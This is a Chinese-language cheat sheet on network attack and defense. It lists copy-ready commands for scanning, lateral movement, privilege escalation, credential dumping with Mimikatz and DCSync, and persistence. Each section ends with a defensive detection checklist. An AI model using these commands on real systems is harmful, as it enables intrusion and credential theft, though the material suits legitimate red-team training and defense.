# 网络攻击与防御速查

> 覆盖网络层攻击技术、内网渗透、横向移动、权限提升、持久化、以及对应的防御检测方法。
> 面向红队攻击和蓝队防御双视角。

---

## 网络侦察

### 主动侦察

```bash
# 端口扫描（Nmap）
nmap -sV -sC -O -p- target              # 全端口+服务+OS
nmap -sU --top-ports 100 target          # UDP 扫描
nmap --script vuln target                # 漏洞脚本扫描
nmap -sn 192.168.1.0/24                  # 存活主机发现

# 快速扫描（Masscan）
masscan -p1-65535 target --rate=10000    # 高速全端口
masscan -p80,443,8080 0.0.0.0/0 --rate=100000  # 全网特定端口

# 服务指纹
nmap -sV --version-intensity 5 target
```

### 被动侦察

```bash
# DNS 信息
dig target.com ANY
dig target.com AXFR @ns1.target.com      # 区域传送
host -t mx target.com
nslookup -type=TXT target.com

# 证书透明度
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value'

# WHOIS
whois target.com

# Shodan/Censys/FOFA
shodan search "hostname:target.com"
```

### 防御检测

```text
□ IDS/IPS 规则：检测端口扫描模式（SYN flood、半开连接）
□ 防火墙日志：异常源 IP 的大量连接尝试
□ 蜜罐：部署在非业务端口，检测扫描行为
□ 网络流量基线：偏离正常流量模式的告警
```

---

## 内网渗透

### 初始访问后信息收集

```bash
# Windows 内网信息
ipconfig /all
net user /domain
net group "Domain Admins" /domain
nltest /dclist:
systeminfo
tasklist /v
netstat -ano

# Linux 内网信息
ifconfig / ip addr
cat /etc/passwd
cat /etc/shadow
ss -tlnp
ps aux
find / -perm -4000 2>/dev/null    # SUID 文件
```

### 横向移动

| 技术 | 工具 | 命令 |
|------|------|------|
| Pass-the-Hash | Impacket | `psexec.py -hashes :NTLM_HASH admin@target` |
| Pass-the-Ticket | Mimikatz | `kerberos::ptt ticket.kirbi` |
| WMI 执行 | Impacket | `wmiexec.py admin:pass@target "whoami"` |
| SMB 执行 | Impacket | `smbexec.py admin:pass@target` |
| WinRM | Evil-WinRM | `evil-winrm -i target -u admin -p pass` |
| RDP | xfreerdp | `xfreerdp /v:target /u:admin /p:pass` |
| SSH 隧道 | ssh | `ssh -L 8080:internal:80 user@pivot` |
| SOCKS 代理 | Chisel | `chisel server -p 8080 --socks5` |

### 防御检测

```text
□ 监控异常登录：非工作时间、异常源 IP、失败次数
□ 检测 PtH：Event ID 4624 Type 3 + NTLM 认证
□ 检测横向移动：Event ID 4648（显式凭证登录）
□ 网络分段：限制工作站间直接通信
□ LAPS：本地管理员密码随机化
□ 特权访问工作站（PAW）：隔离管理操作
```

---

## 权限提升

### Windows 提权

| 技术 | 检测/利用 |
|------|---------|
| 未引用服务路径 | `wmic service get name,pathname \| findstr /v "C:\Windows"` |
| 弱服务权限 | `accesschk.exe -uwcqv "Authenticated Users" *` |
| AlwaysInstallElevated | `reg query HKLM\...\Installer /v AlwaysInstallElevated` |
| 令牌模拟 | `whoami /priv` → SeImpersonatePrivilege → Potato |
| DLL 劫持 | Process Monitor 监控 DLL 加载失败 |
| 计划任务 | `schtasks /query /fo LIST /v` |
| 自动运行 | `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` |

### Linux 提权

| 技术 | 检测/利用 |
|------|---------|
| SUID 二进制 | `find / -perm -4000 2>/dev/null` → GTFOBins |
| sudo 配置 | `sudo -l` → 可利用的 NOPASSWD 命令 |
| Cron 任务 | `cat /etc/crontab` + `ls -la /etc/cron.*` |
| 内核漏洞 | `uname -r` → searchsploit |
| 可写 /etc/passwd | `echo 'root2:$1$...:0:0::/root:/bin/bash' >> /etc/passwd` |
| Docker 逃逸 | `docker run -v /:/host --privileged` |
| Capabilities | `getcap -r / 2>/dev/null` |

### 自动化工具

```bash
# Windows
winPEAS.exe
PowerUp.ps1 → Invoke-AllChecks
Seatbelt.exe -group=all

# Linux
linpeas.sh
linux-exploit-suggester.sh
pspy    # 监控进程（无需 root）
```

### 防御检测

```text
□ 最小权限原则：服务账户不给管理员权限
□ 定期审计 SUID/sudo/计划任务
□ 监控特权操作：Event ID 4672（特殊权限分配）
□ 应用白名单：AppLocker / WDAC
□ 内核补丁：及时更新
```

---

## 凭证获取

### Windows 凭证

```bash
# Mimikatz
sekurlsa::logonpasswords        # 内存中的明文密码
sekurlsa::wdigest               # WDigest 密码
lsadump::sam                    # SAM 数据库
lsadump::dcsync /user:admin     # DCSync 攻击

# 注册表
reg save HKLM\SAM sam.hiv
reg save HKLM\SYSTEM system.hiv
# → secretsdump.py -sam sam.hiv -system system.hiv LOCAL

# LSASS Dump
procdump.exe -ma lsass.exe lsass.dmp
# → pypykatz lsa minidump lsass.dmp
```

### Kerberos 攻击

| 攻击 | 工具 | 说明 |
|------|------|------|
| Kerberoasting | Impacket | `GetUserSPNs.py domain/user:pass -dc-ip DC` |
| AS-REP Roasting | Impacket | `GetNPUsers.py domain/ -usersfile users.txt` |
| Golden Ticket | Mimikatz | 需要 krbtgt hash |
| Silver Ticket | Mimikatz | 需要服务账户 hash |
| Delegation 滥用 | Impacket | 约束/非约束委派利用 |

### 防御检测

```text
□ 启用 Credential Guard（保护 LSASS）
□ 禁用 WDigest（防止明文密码缓存）
□ 监控 LSASS 访问：Sysmon Event ID 10
□ 检测 Kerberoasting：Event ID 4769 + RC4 加密
□ 检测 DCSync：Event ID 4662 + DS-Replication-Get-Changes
□ 强密码策略 + MFA
□ 定期轮换 krbtgt 密码
```

---

## 持久化

### Windows 持久化

| 技术 | 位置/方法 |
|------|---------|
| 注册表 Run 键 | `HKCU\...\Run` |
| 计划任务 | `schtasks /create` |
| 服务 | `sc create` |
| WMI 事件订阅 | `__EventFilter` + `CommandLineEventConsumer` |
| DLL 劫持 | 替换合法 DLL |
| COM 劫持 | 修改 CLSID 注册表 |
| Startup 文件夹 | `%APPDATA%\...\Startup\` |
| Golden Ticket | krbtgt hash → 永久域访问 |

### Linux 持久化

| 技术 | 位置/方法 |
|------|---------|
| Cron 任务 | `/etc/crontab`、`/var/spool/cron/` |
| SSH 密钥 | `~/.ssh/authorized_keys` |
| bashrc/profile | `~/.bashrc` 添加反弹 shell |
| Systemd 服务 | `/etc/systemd/system/` |
| LD_PRELOAD | `/etc/ld.so.preload` |
| PAM 后门 | 修改 `pam_unix.so` |
| Rootkit | 内核模块 / eBPF |

### 防御检测

```text
□ 监控自启动位置变更（Autoruns / osquery）
□ 文件完整性监控（AIDE / Tripwire / Sysmon）
□ 定期审计计划任务和服务
□ 检测异常 SSH 密钥添加
□ EDR 行为检测：异常进程创建链
□ 网络检测：异常外连（C2 通信特征）
```

---

## C2 通信与检测

### 常见 C2 框架

| 框架 | 特点 | 检测难度 |
|------|------|---------|
| Cobalt Strike | 商业级，Beacon 协议 | 中（有签名） |
| Sliver | 开源，Go 编写 | 中 |
| Havoc | 现代 C2，规避能力强 | 高 |
| Mythic | 模块化，多 Agent | 中 |
| Metasploit | 经典，Meterpreter | 低（签名多） |

### C2 通信检测

```text
□ DNS 隧道：异常长域名、高频 TXT 查询、非常规子域名
□ HTTP C2：固定间隔请求、异常 User-Agent、非标准端口 HTTPS
□ 域前置：CDN 域名但实际通信到 C2
□ 加密流量分析：JA3/JA3S 指纹、证书异常
□ 行为检测：进程注入、异常父子进程关系
□ 内存检测：无文件恶意代码（反射 DLL、shellcode）
```

---

## 防御体系建设

### 网络层

```text
□ 网络分段（VLAN + 防火墙规则）
□ 零信任架构（不信任内网流量）
□ IDS/IPS 部署（Suricata / Snort）
□ 全流量记录（Zeek / Arkime）
□ DNS 安全（DNS over HTTPS + 恶意域名拦截）
□ 出口流量监控（检测 C2 外连）
```

### 终端层

```text
□ EDR 部署（CrowdStrike / Defender for Endpoint / Elastic）
□ 应用白名单（AppLocker / WDAC）
□ 补丁管理（WSUS / SCCM）
□ 最小权限（移除本地管理员）
□ 日志集中（Sysmon + Windows Event Forwarding）
□ 磁盘加密（BitLocker）
```

### 身份层

```text
□ MFA 全覆盖（特别是 VPN/RDP/管理后台）
□ 特权访问管理（PAM）
□ 条件访问策略
□ 密码策略（长度 > 复杂度）
□ 服务账户管理（gMSA）
□ 定期凭证轮换
```

### 检测与响应

```text
□ SIEM 部署（Splunk / Elastic / Sentinel）
□ SOAR 自动化响应
□ 威胁情报集成（MISP / OpenCTI）
□ 红蓝对抗演练
□ 应急响应预案（IR Playbook）
□ 取证能力（内存取证 + 磁盘取证 + 网络取证）
```

---

## MITRE ATT&CK 映射

| 战术 | 本文覆盖的技术 |
|------|--------------|
| Reconnaissance | 端口扫描、DNS 枚举、证书透明度 |
| Initial Access | Web 漏洞利用、钓鱼、暴力破解 |
| Execution | 命令注入、WMI、PowerShell |
| Persistence | 注册表、计划任务、SSH 密钥、服务 |
| Privilege Escalation | SUID、Potato、内核漏洞、DLL 劫持 |
| Defense Evasion | 进程注入、无文件、混淆 |
| Credential Access | Mimikatz、Kerberoasting、DCSync |
| Discovery | 内网信息收集、AD 枚举 |
| Lateral Movement | PtH、WMI、SMB、RDP |
| Collection | 数据库导出、文件收集 |
| C2 | HTTP/DNS 隧道、域前置 |
| Exfiltration | DNS 外带、HTTP 上传、云存储 |

---

## 工具速查

| 工具 | 用途 | 链接 |
|------|------|------|
| Nmap | 端口扫描 | https://nmap.org/ |
| Impacket | Windows 协议利用 | https://github.com/fortra/impacket |
| Mimikatz | 凭证提取 | https://github.com/gentilkiwi/mimikatz |
| BloodHound | AD 攻击路径 | https://github.com/BloodHoundAD/BloodHound |
| CrackMapExec | 内网瑞士军刀 | https://github.com/byt3bl33d3r/CrackMapExec |
| Chisel | TCP 隧道 | https://github.com/jpillora/chisel |
| Ligolo-ng | 隧道代理 | https://github.com/nicocha30/ligolo-ng |
| Evil-WinRM | WinRM Shell | https://github.com/Hackplayers/evil-winrm |
| LinPEAS/WinPEAS | 提权枚举 | https://github.com/carlospolop/PEASS-ng |
| Responder | LLMNR/NBT-NS 毒化 | https://github.com/lgandx/Responder |
| Kerbrute | Kerberos 枚举 | https://github.com/ropnop/kerbrute |
| Rubeus | Kerberos 攻击 | https://github.com/GhostPack/Rubeus |
